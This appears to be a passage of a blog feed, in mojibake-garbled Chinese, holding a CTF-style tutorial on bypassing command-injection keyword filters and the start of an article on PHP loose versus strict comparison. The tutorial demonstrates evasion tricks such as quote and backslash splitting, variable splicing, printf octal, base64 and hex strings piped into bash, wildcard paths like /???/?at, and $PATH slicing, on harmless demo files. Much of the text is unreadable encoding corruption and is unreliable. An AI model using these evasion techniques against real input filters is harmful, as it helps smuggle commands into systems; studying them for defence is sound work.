è¾“å‡ºï¼Œå®ƒå°†å‘½ä»¤çš„è¾“å‡ºè¿½åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶çš„æœ«å°¾ï¼Œè€Œä¸æ˜¯è¦†ç›–åŸæœ‰å†…å®¹ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºoutput.txtçš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>&gt;</code>ç¬¦å·å°†å‘½ä»¤çš„è¾“å‡ºä¿å­˜åˆ°output.txtæ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command &gt; output.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºä¿å­˜åˆ°output.txtæ–‡ä»¶ä¸­ã€‚</p><p>è€Œä½¿ç”¨<code>&gt;&gt;</code>ç¬¦å·å¯ä»¥å°†å‘½ä»¤çš„è¾“å‡ºè¿½åŠ åˆ°output.txtæ–‡ä»¶çš„æœ«å°¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt;&gt; output.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†å…¶è¾“å‡ºè¿½åŠ åˆ°output.txtæ–‡ä»¶çš„æœ«å°¾ã€‚</p><p>æ€»ç»“èµ·æ¥ï¼Œ<code>&lt;</code>ç”¨äºé‡å®šå‘è¾“å…¥ï¼Œ<code>&gt;</code>ç”¨äºé‡å®šå‘è¾“å‡ºï¼Œ<code>&gt;&gt;</code>ç”¨äºè¿½åŠ è¾“å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat&lt;hello.txt<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ cat&lt;&gt;hello.txt<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸œè¥¿æ²¡æ³•å’Œlsé…åˆä½¿ç”¨ã€‚</p><p>5.åˆ©ç”¨{}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ &#123;ls,/&#125;<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>å¤§æ‹¬å·ï¼ˆ{}ï¼‰åœ¨è¿™ä¸ªå‘½ä»¤ä¸­è¢«ç”¨ä½œå‘½ä»¤è¡Œæ‰©å±•ã€‚å®ƒä¼šå°†å¤§æ‹¬å·ä¸­çš„å†…å®¹å±•å¼€ä¸ºå¤šä¸ªå‚æ•°ï¼Œç„¶åå°†è¿™äº›å‚æ•°ä¼ é€’ç»™å‘½ä»¤è¿›è¡Œå¤„ç†ã€‚</p><p>6.SQLè¯­å¥ä¸­å¯ä»¥åˆ©ç”¨&#x2F;**&#x2F;å’Œ()åŒ…è£¹å­—ç¬¦ä¸²ä»£æ›¿ç©ºæ ¼(è¿™ä¸ªå°±ä¸ç®—RCEé‡Œçš„ç»•è¿‡äº†ï¼Œå“ˆå“ˆ)</p><p><strong>è¿‡æ»¤å…³é”®å­—ï¼Œæ¯”å¦‚cat,tac,lsä¹‹ç±»çš„</strong></p><p>æ›¿ä»£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br><span class="hljs-built_in">head</span>:æŸ¥çœ‹å¤´å‡ è¡Œ<br><span class="hljs-built_in">tac</span>:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º <span class="hljs-built_in">tac</span> æ˜¯ <span class="hljs-built_in">cat</span> çš„åå‘æ˜¾ç¤º<br><span class="hljs-built_in">tail</span>:æŸ¥çœ‹å°¾å‡ è¡Œ<br><span class="hljs-built_in">nl</span>ï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br><span class="hljs-built_in">od</span>:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æŸäº›è½¬ä¹‰ç¬¦å·ï¼š</p><p><code>&#39;&#39;,&quot;&quot;,\,$&#123;Z&#125;,$*,$@,$ä»»æ„ï¼Œ$&#123;ä»»æ„&#125;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ l&#x27;&#x27;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l&quot;&quot;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$&#123;Z&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l/s<br>bash: l/s: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<br>[viper3@localhost ~]$ l\s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$*s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$@s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$9s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ l$&#123;k&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br></code></pre></td></tr></table></figure><p>æ‹¼æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åå¼•å·&#96;&#96;æˆ–$()ç»•è¿‡(æ¯”å¦‚å’Œprintfé…åˆä½¿ç”¨)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ printf &quot;\154\163&quot;<br>ls<br>[viper3@localhost ~]$ `printf &quot;\154\163&quot;`<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ (printf &quot;\154\163&quot;)<br>ls[viper3@localhost ~]$ $(printf &quot;\154\163&quot;)<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br></code></pre></td></tr></table></figure><p>printf â€œ??????â€è¿™ä¸œè¥¿æ˜¯è¾“å‡º???ä»£è¡¨çš„ASCIIç å€¼ï¼Œ???ä»£è¡¨å…«è¿›åˆ¶(ä¹Ÿå¯ä»¥ç”¨\x??åå…­è¿›åˆ¶)ï¼Œ$()è¿™ä¸ªç¬¦å·æ˜¯æŠŠæ‹¬å·é‡Œé¢çš„ä¸œè¥¿å½“å‘½ä»¤æ‰§è¡Œ,åå¼•å·åŒç†ã€‚</p><p>é€šé…ç¬¦</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">åœ¨Linuxä¸­ï¼Œé€šé…ç¬¦æ˜¯ç”¨æ¥åŒ¹é…æ–‡ä»¶åæˆ–è·¯å¾„çš„ç‰¹æ®Šå­—ç¬¦ã€‚å®ƒä»¬å¯ä»¥ç”¨äºå‘½ä»¤è¡Œä¸­çš„æ–‡ä»¶æœç´¢ã€æ–‡ä»¶æ“ä½œå’Œæ­£åˆ™è¡¨è¾¾å¼ç­‰åœºæ™¯ä¸­ã€‚<br><br>ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„é€šé…ç¬¦ï¼š<br><br>    *ï¼šåŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºå­—ç¬¦ï¼‰çš„ä»»æ„æ•°é‡ã€‚<br>    ?ï¼šåŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦ã€‚<br>    <span class="hljs-selector-attr">[]</span>ï¼šåŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>    <span class="hljs-selector-attr">[!]</span> æˆ– <span class="hljs-selector-attr">[^]</span>ï¼šåŒ¹é…ä¸åœ¨æ–¹æ‹¬å·å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>    &#123;&#125;ï¼šç”¨äºæŒ‡å®šå¤šä¸ªé€‰æ‹©é¡¹ï¼Œä»¥é€—å·åˆ†éš”ã€‚<br>    ~ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚<br><br>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æƒ³åŒ¹é…æ‰€æœ‰ä»¥ <span class="hljs-selector-class">.txt</span> ç»“å°¾çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ *<span class="hljs-selector-class">.txt</span>ï¼›å¦‚æœä½ æƒ³åŒ¹é…ä»¥ <span class="hljs-selector-tag">a</span> å¼€å¤´çš„ä¸‰ä¸ªå­—ç¬¦çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ <span class="hljs-selector-tag">a</span>??ã€‚<br></code></pre></td></tr></table></figure><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat he*<br>hello world!<br>yes<br>no<br>why<br>tom<br>jerry<br>chris<br>jack<br>[viper3@localhost ~]$ cat ?????.txt<br>hello world!<br>yes<br>no<br>why<br>*åŒ¹é…ä»»æ„æ•°é‡ï¼Œè¿™ä¸œè¥¿å¯ä»¥å’ŒfindæŸ¥æ‰¾å‘½ä»¤ç»“åˆèµ·æ¥:<br>find / -name &quot;fl*&quot;   /æ˜¯æ ¹ç›®å½•ï¼Œæœç´¢æ ¹ç›®å½•ä¸‹æ‰€æœ‰åå­—å¸¦flçš„æ–‡ä»¶(flå¼€å¤´ï¼Œåé¢ä»»æ„)<br>æ³¨æ„ï¼šè¿™é‡Œçš„?å’Œ*éƒ½åªèƒ½ç”¨äºæ–‡ä»¶åï¼Œå¦‚æœæ˜¯å‘½ä»¤(ç±»ä¼¼ls catç­‰)å°±ä¸é€‚ç”¨ã€‚<br>ä½†æ˜¯ï¼š<br>m0reå¸ˆå‚…çš„æ–‡ç« é‡Œåœ¨å¼€å¤´åŠ äº†ä¸ª/???å°±å¯ä»¥æŠŠ/?ç”¨äºå‘½ä»¤äº†ï¼š<br><br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?at flag<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?at ????<br>you are good!<br>zxcv0221@kali:~/æ¡Œé¢$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br></code></pre></td></tr></table></figure><p><strong>ç¼–ç ç»•è¿‡(åº”è¯¥æŠŠå‰é¢é‚£ä¸ªprintfçš„æ”¾åœ¨è¿™é‡Œçš„ï¼Œå¯æƒœ)ï¼š</strong></p><p>base64:(è¿™ä¸œè¥¿å¯ä»¥å’Œå‰é¢çš„&#96;&#96;å’Œ$()é…åˆä½¿ç”¨)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d<br>cat hello.txt<br>[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`<br>hello world!<br>yes<br>no<br>why<br><br>Y2F0IGhlbGxvLnR4dA== æ˜¯cat hello.txtçš„base64<br></code></pre></td></tr></table></figure><p>hex:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag<br><br>åŒä¸Šï¼Œä»èƒ½ç”¨``åŠ$()æ›¿æ¢æœ€åç®¡é“ç¬¦åŠbash<br></code></pre></td></tr></table></figure><p>æ¢è¡Œç»•è¿‡(æ„Ÿè§‰è¿™ä¸ªæ²¡æ€ä¹ˆç”¨è¿‡)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ca\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">t \</span><br><span class="language-bash">&gt; hello\</span><br><span class="language-bash">&gt; .txt</span><br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>\è¡¨ç¤ºæ¢è¡Œï¼Œä¸‹ä¸€è¡Œæ˜¯è¿™è¡Œçš„å»¶ç»­ã€‚</p><p>m0reå¸ˆå‚…çš„æ–‡ç« ä¸­è¿˜æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ca\\&quot;</span>&gt;shell   ä¸¤ä¸ª\æ˜¯ä¸ºäº†è½¬ä¹‰åé¢çš„\ï¼Œä»¥ä¾¿å°†å…¶ä½œä¸ºæ™®é€šå­—ç¬¦å†™å…¥æ–‡ä»¶ã€‚</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> shell</span><br>ca\<br>t\<br> fl\<br>ag<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh shell</span>  <br>you are good!<br><br>sh shellæ˜¯è¿è¡Œåä¸º&quot;shell&quot;çš„è„šæœ¬æ–‡ä»¶çš„æ„æ€ã€‚åœ¨Linuxä¸­ï¼Œä½¿ç”¨shå‘½ä»¤åè·Ÿè„šæœ¬æ–‡ä»¶çš„åç§°å¯ä»¥è¿è¡Œè¯¥è„šæœ¬ã€‚<br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨$PATHç¯å¢ƒå˜é‡ç»•è¿‡ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo $PATH<br>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin<br>[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;<br>ls<br>[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>crontab    hello.txtttttt  whatsthetime.txt  æ¨¡æ¿  å›¾ç‰‡  ä¸‹è½½  æ¡Œé¢<br>hello.txt  runme2   å…¬å…±     è§†é¢‘  æ–‡æ¡£  éŸ³ä¹<br>[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>&quot;hello.txt&quot;:1: bad minute<br>errors in crontab file, can&#x27;t install.<br><br>æ³¨æ„ä¸è¦å°‘äº†echo!<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šå†…å®¹å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_53142368/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">116152477</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">391439312</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45836474/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107248010</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net/qq_51295677?type=blog<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPä¸­çš„å¼±ç›¸ç­‰å’Œå¼ºç›¸ç­‰</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>å…¥é—¨çº§ç†è§£ï¼Œæ²¡å•¥å«é‡‘é‡:)</p><span id="more"></span><hr><p>æœ¬äººçš„ä¸€ç‚¹æ‹™è§ã€‚</p><p>å…ˆçœ‹ä¸‹GPTå¯¹å¼±ç›¸ç­‰å’Œå¼ºç›¸ç­‰çš„è§£é‡Šï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">åœ¨PHPä¸­ï¼Œå¼±ç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰å’Œå¼ºç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰æ˜¯ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼çš„æ“ä½œç¬¦ï¼Œå®ƒä»¬æœ‰ä»¥ä¸‹åŒºåˆ«ï¼š<br><br>    <span class="hljs-number">1</span>.å¼±ç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰ï¼šå¼±ç›¸ç­‰ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸è€ƒè™‘å€¼çš„æ•°æ®ç±»å‹ã€‚å¦‚æœä¸¤ä¸ªå€¼åœ¨è½¬æ¢åç›¸ç­‰ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¼±ç›¸ç­‰ä¼šè‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œä¾‹å¦‚å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒã€‚<br><br>    <span class="hljs-number">2</span>.å¼ºç›¸ç­‰ï¼ˆ<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>ï¼‰ï¼šå¼ºç›¸ç­‰ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¸”è¦æ±‚ä¸¤ä¸ªå€¼çš„æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚é™¤äº†æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰å¤–ï¼Œè¿˜è¦æ±‚æ¯”è¾ƒçš„ä¸¤ä¸ªå€¼çš„æ•°æ®ç±»å‹ä¹Ÿç›¸åŒã€‚å¦‚æœå€¼å’Œæ•°æ®ç±»å‹éƒ½ç›¸ç­‰ï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¼ºç›¸ç­‰ä¸ä¼šè¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢<br></code></pre></td></tr></table></figure><p>åœ¨å¼±ç›¸ç­‰æ¯”è¾ƒä¸­ï¼Œ<code>ä¸è€ƒè™‘æ•°æ®ç±»å‹</code>ï¼Œ<code>è½¬æ¢å</code>ç›¸ç­‰è¿”å›<code>true</code>,å¦åˆ™è¿”å›<code>false</code>ã€‚æ‰€ä»¥æ•´å‹ã€æµ®ç‚¹å‹ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å‹ç­‰å‡å¯æ¯”è¾ƒï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//å­—ç¬¦ä¸²å’Œæ•´å‹æˆ–æµ®ç‚¹å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²è‹¥ä»¥æ•°å­—å¼€å¤´åˆ™ä»å¼€å¤´æˆªå–åˆ°å­—æ¯å‡ºç°çš„ä½ç½®ï¼š</span><br><span class="hljs-string">&#x27;111&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111abc&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111admin&#x27;</span> == <span class="hljs-number">111.000000</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;notbad3333&#x27;</span> == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br><span class="hljs-comment">//å¸ƒå°”å‹ä¸å­—ç¬¦ä¸²å’Œæ•´å‹åŠæµ®ç‚¹å‹å‡å¯ç›¸äº’æ¯”è¾ƒï¼š</span><br>True == <span class="hljs-string">&#x27;hello world!&#x27;</span><span class="hljs-comment">//True</span><br>True == <span class="hljs-string">&#x27;123abc&#x27;</span> <span class="hljs-comment">//True,å­—ç¬¦ä¸²é‡Œé¢åªè¦ä¸æ˜¯å•ä¸ª0ï¼Œä»»ä½•ç»„åˆ(å“ªæ€•æ˜¯0.0)éƒ½ä¸Trueå¼±ç›¸ç­‰</span><br>True ==<span class="hljs-string">&#x27;0.0000&#x27;</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0.0</span> <span class="hljs-comment">//True,0.0000ç­‰åŒç†</span><br>False == <span class="hljs-literal">null</span> <span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//True</span><br>False ==<br><span 